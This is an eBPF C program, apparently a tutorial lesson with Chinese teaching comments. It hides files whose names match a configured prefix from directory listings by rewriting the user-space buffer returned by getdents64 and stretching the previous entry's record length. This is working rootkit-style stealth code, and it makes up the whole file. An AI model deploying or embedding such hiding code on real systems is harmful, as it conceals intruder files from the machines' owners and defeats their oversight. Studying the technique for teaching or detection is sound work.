// SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause)
/* 24-hide: hide files from directory listings by rewriting getdents64 output.
 *
 * On sys_enter_getdents64, save the dirent buffer pointer keyed by pid.  On
 * sys_exit_getdents64, walk the returned buffer.  For entries whose name
 * matches the target prefix, rewrite the previous entry's d_reclen to skip
 * over the hidden entry (effectively removing it from the listing).
 *
 * 教学概念：
 * - enter/exit tracepoint 配对，用 hash map 传递缓冲区指针
 * - bpf_probe_read_user / bpf_probe_write_user 读写用户态内存
 * - linux_dirent64 结构解析（d_ino, d_reclen, d_name）
 * - 有界循环（verifier 要求确定的循环上界）
 *
 * linux_dirent64 结构（内核 uapi）：
 *   u64 d_ino;          // 偏移 0:  inode 号
 *   s64 d_off;          // 偏移 8:  到下一个条目的偏移
 *   u16 d_reclen;       // 偏移 16: 本条目总长度
 *   u8  d_type;         // 偏移 18: 文件类型
 *   char d_name[];      // 偏移 19: 文件名（柔性数组）
 *
 * 隐藏策略：把前一个条目的 d_reclen 加上当前条目的 d_reclen，
 * 使 getdents64 的消费方（ls 等）跳过被隐藏的条目。
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

/* 最多遍历的目录条目数（verifier 需要确定的循环上界） */
#define MAX_DIRENT_COUNT 256

/* d_reclen 在 linux_dirent64 中的偏移量 */
#define D_RECLEN_OFFSET 16
/* d_name 在 linux_dirent64 中的偏移量 */
#define D_NAME_OFFSET   19

const volatile int target_strlen = 0;  /* 目标前缀长度 */
const char target_name[16] = {};       /* 要隐藏的文件名前缀 */

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, u32);     /* pid */
	__type(value, void*); /* dirent 缓冲区指针 */
} dirent_map SEC(".maps");

SEC("tp/syscalls/sys_enter_getdents64")
int handle_enter(struct trace_event_raw_sys_enter *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	void *dirent = (void *)ctx->args[1];

	bpf_map_update_elem(&dirent_map, &pid, &dirent, BPF_ANY);
	return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_exit(struct trace_event_raw_sys_exit *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	void **direntp, *dirent;
	int ret = (int)ctx->ret;
	char name[16], tmp[16];
	long pos = 0;
	__u16 prev_reclen_off = 0;  /* 前一个条目的 d_reclen 字段在缓冲区中的偏移 */
	bool has_prev = false;
	int i;

	if (ret <= 0)
		goto out;
	direntp = bpf_map_lookup_elem(&dirent_map, &pid);
	if (!direntp)
		return 0;
	dirent = *direntp;

	if (target_strlen <= 0 || target_strlen > 16)
		goto out;
	bpf_probe_read_kernel(tmp, target_strlen, target_name);

	/* 有界循环遍历 dirent 数组 */
#pragma unroll
	for (i = 0; i < MAX_DIRENT_COUNT; i++) {
		__u16 d_reclen;

		if (pos >= ret)
			break;

		/* 读取 d_reclen（偏移 16, 2 字节） */
		if (bpf_probe_read_user(&d_reclen, sizeof(d_reclen),
					(void *)(dirent + pos + D_RECLEN_OFFSET)))
			break;
		if (d_reclen == 0 || pos + d_reclen > ret)
			break;

		/* 读取文件名（偏移 19） */
		bpf_probe_read_user_str(name, sizeof(name),
					(void *)(dirent + pos + D_NAME_OFFSET));

		/* 比较文件名前缀 */
		bool match = true;
		for (int j = 0; j < 16; j++) {
			if (j >= target_strlen)
				break;
			if (name[j] != tmp[j]) { match = false; break; }
		}

		if (match && has_prev) {
			/* 隐藏当前条目：把前一个条目的 d_reclen 加上当前条目的
			 * d_reclen，使消费方跳过被隐藏的条目。 */
			__u16 new_reclen;
			__u16 prev_reclen;

			/* 读取前一个条目的 d_reclen */
			if (bpf_probe_read_user(&prev_reclen, sizeof(prev_reclen),
						(void *)(dirent + prev_reclen_off)))
				goto next;

			/* 新 reclen = 前条目 reclen + 当前条目 reclen */
			new_reclen = prev_reclen + d_reclen;

			/* 写回前一个条目的 d_reclen */
			bpf_probe_write_user(
				(void *)(dirent + prev_reclen_off),
				&new_reclen, sizeof(new_reclen));
		} else {
			/* 不隐藏：当前条目成为下一轮的 "前一个条目" */
			prev_reclen_off = pos + D_RECLEN_OFFSET;
			has_prev = true;
		}

next:
		pos += d_reclen;
	}

out:
	bpf_map_delete_elem(&dirent_map, &pid);
	return 0;
}
